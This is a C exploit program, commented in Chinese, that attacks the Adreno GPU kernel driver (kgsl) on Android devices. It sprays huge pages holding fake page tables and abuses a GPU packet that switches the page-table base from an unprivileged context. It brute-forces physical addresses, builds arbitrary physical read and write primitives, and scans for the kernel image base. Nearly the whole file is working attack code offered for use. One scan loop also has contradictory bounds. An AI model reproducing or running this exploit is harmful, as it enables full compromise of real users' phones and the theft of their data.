/* kgsl_ttbr0.c — Adrenaline 战役(§23.3)
 * 原理: 0x70D38003 {TTBR0,0,0} 从 IB1 可执行(A642 无特权检查, §BO)。
 *       喷 N 个 2MB THP 块, 每块 page0 = 自指假页表(L0/L1/L2[0,1,2]=B|3, L3[3,4]=B|attrs)。
 *       探测: 改写各块 page0(B_guess) → 提交 {0xD3{B_guess} + CP_MEM_WRITE marker→VA 0x40404100}
 *       → 若 B_guess = 某块真实物理基, marker 落在该块 page0+0x100(CPU 可见)。
 *       命中后: L3[3] 指向任意物理页 → MEM_TO_MEM 读回 = GPU 任意物理读。
 *
 * 用法: ttbr0 probe [start_hex] [count]   (默认 0x80000000 起 6144 个, 2MB 步进)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define BLOCK_SZ 0x200000UL
#define NBLOCKS 64
#define MARKER_VA 0x40404100ULL
#define WIN_VA    0x40403000ULL   /* L3[3] 窗口 */

#define AFLAGS (0x3 | (1<<6) | (3<<2) | (2<<8) | (1<<10) | (1<<11))  /* valid|RW|NNC|OSH|AF|nG */

static int fd;
static uint64_t g_clsz;
static uint32_t *ib, *out;
static uint64_t ib_ga, out_ga;
static uint8_t *blk[NBLOCKS];
static uint32_t ctx = 0;
static int have_ctx = 0;

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static int ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (r) return -1;
    ctx = req.drawctxt_id;
    have_ctx = 1;
    return 0;
}
static void ctx_recreate(void) {
    if (have_ctx) ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
                        &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}

/* ---- THP 喷射 ---- */
static long thp_bytes_of(void *p) {
    /* 从 /proc/self/smaps 读包含 p 的 VMA 的 AnonHugePages */
    FILE *f = fopen("/proc/self/smaps", "r");
    if (!f) return -1;
    char line[256];
    uintptr_t target = (uintptr_t)p;
    int in = 0;
    long thp = -1;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) {
            in = (target >= lo && target < hi);
            if (in) thp = 0;
        } else if (in && !strncmp(line, "AnonHugePages:", 14)) {
            sscanf(line + 14, "%ld", &thp);
        }
    }
    fclose(f);
    return thp;
}

static int spray(void) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint8_t *raw = mmap(NULL, BLOCK_SZ * 2, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (raw == MAP_FAILED) { printf("mmap fail j=%d\n", j); return 1; }
        uint8_t *base = (uint8_t*)(((uintptr_t)raw + BLOCK_SZ - 1) & ~(BLOCK_SZ - 1));
        if (madvise(base, BLOCK_SZ, MADV_HUGEPAGE)) { printf("madvise fail %s\n", strerror(errno)); }
        memset(base, 0, BLOCK_SZ);          /* 触发分配 */
        blk[j] = base;
    }
    long thp = thp_bytes_of(blk[0]);
    int thp_ok = 0;
    for (int j = 0; j < NBLOCKS; j++)
        if (thp_bytes_of(blk[j]) >= (long)BLOCK_SZ / 1024) thp_ok++;
    printf("[spray] %d blocks @ %p..%p, THP: %d/%d 完整 2MB (块0=%ldKB) %s\n",
           NBLOCKS, blk[0], blk[NBLOCKS-1], thp_ok, NBLOCKS, thp / 1024,
           thp_ok == NBLOCKS ? "OK" : "(!! 部分 THP 缺失)");
    return (thp_ok == NBLOCKS) ? 0 : 1;
}

/* ---- 假表填充 v3(各块 page0) — 规范合法描述符 + 双路径叶:
 * p[0] = B|3        (L0[0] table, start-L0 兜底)
 * p[1] = B|3        (L1[1] table)
 * p[2] = B|blk_af   (L2[2] 2MB BLOCK) → VA[0x40400000,0x40600000) → phys[B,B+2MB)
 * p[3] = B|3        (L2[3] table) → L3(=page0) → p[6+k] leaf → VA 0x4060k000 → B+k*0x1000
 * p[6..31] = (B+k*0x1000)|leaf_af (L3 叶, bit1=0 规范合法)
 * 块 j 用 MemAttr (j%8) 轮转 */
static void fill_tables(uint64_t B) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint64_t *p = (uint64_t*)blk[j];
        uint64_t blk_af = 0x1 | (1 << 6) | (((uint64_t)(j % 8)) << 2) | (2 << 8) | (1 << 10) | (1 << 11);
        memset(p, 0, 0x1000);
        p[0] = B | 3;
        p[1] = B | 3;
        p[2] = B | blk_af;
        p[3] = B | 3;
        for (int k = 0; k < 26; k++)
            p[6 + k] = (B + (uint64_t)k * 0x1000) | blk_af;
    }
    for (int j = 0; j < NBLOCKS; j++)
        cache_op(blk[j], blk[j] + 0x1000, 0);
}

/* ---- probe ---- */
/* ================= 阶段 2/3: B 已知 → 层级重建 → 任意物理读写 → 内核扫描 ================= */
static uint8_t *Jb;          /* 命中块 VA */
static uint64_t JB;          /* 命中块物理基 */
static uint64_t cur_W;       /* 当前 1GB 窗口基 */

/* 层级布局(物理, 全在命中块内):
 * page0@B+0x0000  : TTBR0/L1: [0]=(B+0x1000)|3 (start-L0 L0[0]), [1]=(B+0x2000)|3 (L1[1]),
 *                   [2]=W|1 (L1[2] = 1GB 扫描窗, start-L0/L1 通用)
 * page1@B+0x1000  : L1(start-L0)/L2(start-L1): [0]=W|1 (VA 0x80000000 的 L2/L1 槽),
 *                   [1]=(B+0x3000)|3, [2]=(B+0x3000)|3
 * page2@B+0x2000  : L2(start-L0): [2]=(B+0x3000)|3
 * page3@B+0x3000  : L3: [3]=(B+0x5000)|AFLAGS → VA 0x40403000 = 交换页(4KB, CPU 可见)
 * exch @B+0x5000  : 交换页(blk+0x5000)
 */
static void build_hierarchy(void) {
    uint64_t *pg0 = (uint64_t*)Jb;
    uint64_t *pg1 = (uint64_t*)(Jb + 0x1000);
    uint64_t *pg2 = (uint64_t*)(Jb + 0x2000);
    uint64_t *pg3 = (uint64_t*)(Jb + 0x3000);
    memset(pg0, 0, 0x4000);            /* page0..3 */
    memset(Jb + 0x5000, 0, 0x1000);    /* 交换页 */
    pg0[0] = (JB + 0x1000) | 3;
    pg0[1] = (JB + 0x2000) | 3;
    cur_W = 0;
    pg1[1] = (JB + 0x3000) | 3;
    pg1[2] = (JB + 0x3000) | 3;
    pg2[2] = (JB + 0x3000) | 3;
    pg3[3] = (JB + 0x5000) | AFLAGS;
    cache_op(Jb, Jb + 0x6000, 0);
}

static int submit_ib(uint32_t dwords) {
    int r = gpu_command(ib_ga, dwords * 4);
    if (r) { ctx_recreate(); r = gpu_command(ib_ga, dwords * 4); }
    usleep(120000);
    return r;
}

/* 设置 1GB 扫描窗基 W(1GB 对齐), 返回 VA 基 0x80000000 */
static void set_window(uint64_t W) {
    if (W == cur_W) return;
    cur_W = W;
    *(uint64_t*)Jb = 0; *(uint64_t*)(Jb + 0x1000) = 0;
    *(uint64_t*)(Jb + 0x0000) = (JB + 0x1000) | 3;
    *(uint64_t*)(Jb + 0x0008) = (JB + 0x2000) | 3;
    *(uint64_t*)(Jb + 0x0010) = W | 1;          /* pg0[2] = L1[2] block */
    *(uint64_t*)(Jb + 0x1008) = W | 1;          /* pg1[0] = L1(start-L0)[2] / L2(start-L1)[0] block */
    cache_op(Jb, Jb + 0x2000, 0);
}

/* 任意物理读 4 字节(单发) */
static uint32_t phys_read32(uint64_t T, int *ok) {
    set_window(T & ~0x3FFFFFFFull);
    uint64_t va = 0x80000000ull + (T & 0x3FFFFFFFull);
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
    *c++ = 0;
    *c++ = 0x40403000; *c++ = 0;                /* dst = 交换页 */
    *c++ = lower_32_bits(va); *c++ = upper_32_bits(va);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
    submit_ib(6);
    cache_op(Jb + 0x5000, Jb + 0x5004, 1);
    uint32_t v = *(uint32_t*)(Jb + 0x5000);
    *(uint32_t*)(Jb + 0x5000) = 0;
    cache_op(Jb + 0x5000, Jb + 0x5004, 0);
    *ok = 1;
    return v;
}
/* 任意物理写 4 字节 */
static void phys_write32(uint64_t T, uint32_t v) {
    set_window(T & ~0x3FFFFFFFull);
    uint64_t va = 0x80000000ull + (T & 0x3FFFFFFFull);
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(va); *c++ = upper_32_bits(va);
    *c++ = v;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x10, 0);
    submit_ib(4);
}

static void phase2(uint64_t B, int hit) {
    Jb = blk[hit];
    JB = B;
    printf("\n===== 阶段 2: 层级重建(B=0x%llx 块=%d) =====\n", (unsigned long long)B, hit);
    build_hierarchy();
    ctx_recreate();

    /* 验证 1: 交换页路径 — 已知内容自读: 读 phys B+0x5000(交换页自己, 先埋值) */
    *(uint32_t*)(Jb + 0x5000) = 0x5A5A5A5A;
    cache_op(Jb + 0x5000, Jb + 0x5004, 0);
    /* 读 phys B+0x1000 头 4 字节 = pg1[0] 当前值(应为 0, 因为 build 清零) → 交换页应收到 0 */
    int ok;
    uint32_t v = phys_read32(B + 0x1000, &ok);
    printf("验证读 phys(B+0x1000)=0x%08x (期望 0x00000000) %s\n", v, v == 0 ? "✓" : "?");
    /* 验证 2: 写已知值到 B+0x6000 再读回 */
    phys_write32(B + 0x6000, 0xCAFEF00D);
    uint32_t expect = *(uint32_t*)(Jb + 0x6000);
    cache_op(Jb + 0x6000, Jb + 0x6004, 1);
    expect = *(uint32_t*)(Jb + 0x6000);
    phys_write32(B + 0x6000, 0x00000000);   /* 恢复 */
    (void)expect;
    v = phys_read32(B + 0x6000, &ok);
    printf("验证写读 phys(B+0x6000)=0x%08x %s\n", v,
           v == 0 ? "← 已被恢复写清零, 写原语生效 ✓" : "(异常)");

    /* 阶段 3: 内核映像扫描(ARMd64 魔数 @ phys 基+0x38, 2MB 对齐候选) */
    printf("\n===== 阶段 3: 内核物理基扫描(1GB 窗 × 512 候选) =====\n");
    double t0 = now_s();
    uint64_t kernel_base = 0;
    for (uint64_t W = 0x400000000ull; W < 0x380000000ull && !kernel_base; W += 0x40000000ull) {
        set_window(W);
        /* IB: 512 × MEM_TO_MEM dst=0x40403000+k*4 ← src=0x80000000+k*0x200000+0x38 */
        uint32_t *c = ib;
        for (int k = 0; k < 512; k++) {
            uint64_t src = 0x80000000ull + (uint64_t)k * 0x200000ull + 0x38;
            *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
            *c++ = 0;
            *c++ = 0x40403000 + k * 4; *c++ = 0;
            *c++ = lower_32_bits(src); *c++ = upper_32_bits(src);
        }
        cache_op((uint8_t*)ib, (uint8_t*)ib + (c - ib) * 4, 0);
        submit_ib((uint32_t)(c - ib));
        cache_op(Jb + 0x5000, Jb + 0x6000, 1);
        for (int k = 0; k < 512; k++) {
            uint32_t v = *(uint32_t*)(Jb + 0x5000 + k * 4);
            if (v == 0x644d5241) {   /* 'ARMd' */
                kernel_base = W + (uint64_t)k * 0x200000ull;
                printf("*** 内核物理基候选: 0x%llx (窗口 0x%llx #%d) ***\n",
                       (unsigned long long)kernel_base, (unsigned long long)W, k);
            }
        }
        printf("  窗口 0x%llx 完成 (%.1fs)\n", (unsigned long long)W, now_s() - t0);
    }
    if (!kernel_base) {
        printf("未找到 ARMd64 魔数 — 扩大搜索或换判据(如 kallsyms 内容比对)\n");
        return;
    }
    /* 复核: 连读头部字段 */
    printf("\n复核内核头(物理基 0x%llx):\n", (unsigned long long)kernel_base);
    for (int off = 0; off <= 0x38; off += 8) {
        uint32_t lo = phys_read32(kernel_base + off, &ok);
        uint32_t hi = phys_read32(kernel_base + off + 4, &ok);
        printf("  +0x%02x: %08x %08x\n", off, hi, lo);
    }
    FILE *f = fopen("/data/local/tmp/ttbr_state.txt", "w");
    if (f) {
        fprintf(f, "B=0x%llx\nblock_va=%p\nkernel_phys=0x%llx\n",
                (unsigned long long)JB, Jb, (unsigned long long)kernel_base);
        fclose(f);
    }
    printf("状态已存 /data/local/tmp/ttbr_state.txt\n");
}

static void probe(uint64_t start, uint64_t count) {
    if (spray()) { printf("spray/THP 失败, 终止\n"); return; }
    ctx_create();
    uint64_t marker32 = 0x41414141;
    double t0 = now_s();
    for (uint64_t k = 0; k < count; k++) {
        uint64_t B = start + k * BLOCK_SZ;
        fill_tables(B);
        /* IB: 0xD3{B,0,0,0} + 整块喷洒 marker(L2-block 64 发 + L3-leaf 26 发, 值含编号) */
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B);
        *c++ = upper_32_bits(B);
        *c++ = 0;                                  /* CONTEXTIDR */
        *c++ = 0;                                  /* flags */
        for (int k2 = 0; k2 < 64; k2++) {          /* 路径1: L2 block, VA 0x40400000+k2*0x8000 */
            *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
            *c++ = 0x40400000u + (uint32_t)k2 * 0x8000u; *c++ = 0;
            *c++ = 0x41414141u;
            *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
            *c++ = 0x40400004u + (uint32_t)k2 * 0x8000u; *c++ = 0;
            *c++ = 0x41410000u | (uint32_t)k2;
        }
        for (int k2 = 0; k2 < 26; k2++) {          /* 路径2: L3 leaf, VA 0x40600000+k2*0x1000 */
            *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
            *c++ = 0x40600000u + (uint32_t)k2 * 0x1000u; *c++ = 0;
            *c++ = 0x42424242u;
            *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
            *c++ = 0x40600004u + (uint32_t)k2 * 0x1000u; *c++ = 0;
            *c++ = 0x42420000u | (uint32_t)k2;
        }
        uint32_t ib_dw = (uint32_t)(c - ib);
        cache_op((uint8_t*)ib, (uint8_t*)ib + ib_dw * 4, 0);
        int r = gpu_command(ib_ga, ib_dw * 4);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, ib_dw * 4); }
        usleep(150000);
        /* 全喷洒区扫描: 找 0x4141xxxx / 0x4242xxxx */
        int hit = -1; uint32_t hit_val = 0; uint64_t hit_off = 0;
        for (int j = 0; j < NBLOCKS && hit < 0; j++) {
            cache_op(blk[j], blk[j] + BLOCK_SZ, 1);
            uint32_t *w = (uint32_t*)blk[j];
            for (uint64_t o = 0; o < BLOCK_SZ / 4; o++) {
                uint32_t v = w[o];
                if (v == 0x41414141u || v == 0x42424242u) {
                    hit = j; hit_val = v; hit_off = o * 4; break;
                }
            }
        }
        if (k % 64 == 0)
            printf("  [%7.1fs] %llu/%llu B=0x%llx submit=%d\n",
                   now_s() - t0, (unsigned long long)k + 1, (unsigned long long)count,
                   (unsigned long long)B, r);
        if (hit >= 0) {
            printf("\n*** HIT: B = 0x%llx (块 %d) val=0x%08x 块内偏移=0x%llx 用时 %.1fs ***\n",
                   (unsigned long long)B, hit, hit_val, (unsigned long long)hit_off, now_s() - t0);
            FILE *f = fopen("/data/local/tmp/ttbr_hit.txt", "w");
            if (f) { fprintf(f, "B=0x%llx block=%d va=%p off=0x%llx val=0x%08x\n",
                             (unsigned long long)B, hit, blk[hit], (unsigned long long)hit_off, hit_val);
                     fclose(f); }
            phase2(B, hit);
            return;
        }
    }
    printf("范围 [0x%llx, 0x%llx) 无命中 (%.1fs)\n",
           (unsigned long long)start, (unsigned long long)(start + count * BLOCK_SZ), now_s() - t0);
}

/* 决定性判别: 正确编码 0x70D30004 {垃圾TTBR0,0,0} + MEM_WRITE(真映射 ib 自身)
 * 落地 = 处理器被特权检查跳过; 未落地+fault = TTBR0 真被切换 */
static void do_smmu4(void) {
    ctx_create();
    uint32_t *c = ib;
    *c++ = cp_type7_packet(0xD3, 4);
    *c++ = lower_32_bits(0xdeadbeef000ull);
    *c++ = upper_32_bits(0xdeadbeef000ull);
    *c++ = 0; *c++ = 0;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(ib_ga + 0x800);
    *c++ = upper_32_bits(ib_ga + 0x800);
    *c++ = 0xD3D3D3D3;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ib_ga, 36);
    usleep(400000);
    cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 1);
    printf("smmu4(count=4): submit=%d ib[+0x800]=0x%08x %s\n", r, ib[0x200],
           ib[0x200] == 0xD3D3D3D3 ? "→ 落地 = 0xD3 被跳过(特权检查存在)" : "→ 未落地 = 疑似已切换(trace 确认 fault)");
}

/* ===== 时序判别: CP_WAIT_REG_MEM 轮询假表映射地址 =====
 * walk 成功 → 轮询立即满足 → 批次快速退役; walk 失败 → 永不满足 → kgsl 超时(秒级)。
 * 对照组: 轮询真映射地址(ib+0x800, 值 0) → 验证 wait 编码正确性。 */
static uint64_t wait_ts(int fd2, uint32_t ctx, uint32_t ts, uint32_t timeout_ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { ctx, ts, timeout_ms };
    double t0 = now_s();
    ioctl(fd2, _IOWR(0x09, 0x07, char[12]), &w);
    return (uint64_t)((now_s() - t0) * 1000);
}

static void do_wait(void) {
    if (spray()) return;
    uint32_t ts = 0;

    /* helper: 提交一个 IB 并测退役延迟 */
    #define SUBMIT_WAIT(tag, slow_ok) do { \
        ts++; \
        int r = gpu_command(ib_ga, (uint32_t)((ib_ptr - ib)) * 4); \
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, (uint32_t)((ib_ptr - ib)) * 4); } \
        uint64_t ms = wait_ts(fd, ctx, ts, 8000); \
        printf("%-28s submit=%d 退役=%llums %s\n", tag, r, (unsigned long long)ms, \
               ms < 600 ? "[快速=满足]" : "[慢速=超时]"); \
    } while (0)

    /* 1. 对照-快速: 轮询真映射 ib+0x800, ref=0(实际值) */
    ctx_create();
    uint32_t *ib_ptr = ib;
    *ib_ptr++ = cp_type7_packet(0x3c, 6);
    *ib_ptr++ = 0;
    *ib_ptr++ = lower_32_bits(ib_ga + 0x800); *ib_ptr++ = upper_32_bits(ib_ga + 0x800);
    *ib_ptr++ = 0; *ib_ptr++ = 0xFFFFFFFF; *ib_ptr++ = 0x00000006;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    SUBMIT_WAIT("对照-快速(应快)", 0);

    /* 2. 对照-挂起: 同地址, ref=0xDEADBEEF(永不满足) → 应超时 ~2s */
    ib_ptr = ib;
    *ib_ptr++ = cp_type7_packet(0x3c, 6);
    *ib_ptr++ = 0;
    *ib_ptr++ = lower_32_bits(ib_ga + 0x800); *ib_ptr++ = upper_32_bits(ib_ga + 0x800);
    *ib_ptr++ = 0xDEADBEEFu; *ib_ptr++ = 0xFFFFFFFF; *ib_ptr++ = 0x00000006;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    SUBMIT_WAIT("对照-挂起(应慢~2s)", 1);

    /* 3. 候选: 切换到 B + 轮询假表 p[0] 的实际值 (B|3)&0xffffffff */
    uint64_t cands[5] = { 0x40000000ull, 0x40020000ull, 0x40200000ull, 0x80000000ull, 0x100000000ull };
    for (int i = 0; i < 5; i++) {
        uint64_t B = cands[i];
        ctx_recreate();
        fill_tables(B);
        uint32_t ref = (uint32_t)((B | 3) & 0xFFFFFFFFull);
        ib_ptr = ib;
        *ib_ptr++ = cp_type7_packet(0xD3, 4);
        *ib_ptr++ = lower_32_bits(B); *ib_ptr++ = upper_32_bits(B);
        *ib_ptr++ = 0; *ib_ptr++ = 0;
        *ib_ptr++ = cp_type7_packet(0x3c, 6);
        *ib_ptr++ = 0;
        *ib_ptr++ = 0x40404000; *ib_ptr++ = 0;      /* 轮询 VA 0x40404000 → 假表映射 phys B */
        *ib_ptr++ = ref; *ib_ptr++ = 0xFFFFFFFF;
        *ib_ptr++ = 0x00000006;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        char tag[64];
        snprintf(tag, sizeof(tag), "候选 B=0x%llx", (unsigned long long)B);
        SUBMIT_WAIT(tag, 0);
    }
    #undef SUBMIT_WAIT
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open kgsl fail\n"); return 1; }
    ib = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    out = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x10000); memset(out, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x10000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map ib fail\n"); return 1; }
    ib_ga = m.gpuaddr;

    if (argc >= 2 && !strcmp(argv[1], "probe")) {
        uint64_t start = argc > 2 ? strtoull(argv[2], NULL, 0) : 0x80000000ull;
        uint64_t count = argc > 3 ? strtoull(argv[3], NULL, 0) : 6144;
        probe(start, count);
    } else if (argc >= 2 && !strcmp(argv[1], "smmu4")) {
        do_smmu4();
    } else if (argc >= 2 && !strcmp(argv[1], "wait")) {
        do_wait();
    } else {
        printf("usage: ttbr0 probe [start] [count] | smmu4\n");
    }
    printf("done alive\n");
    return 0;
}
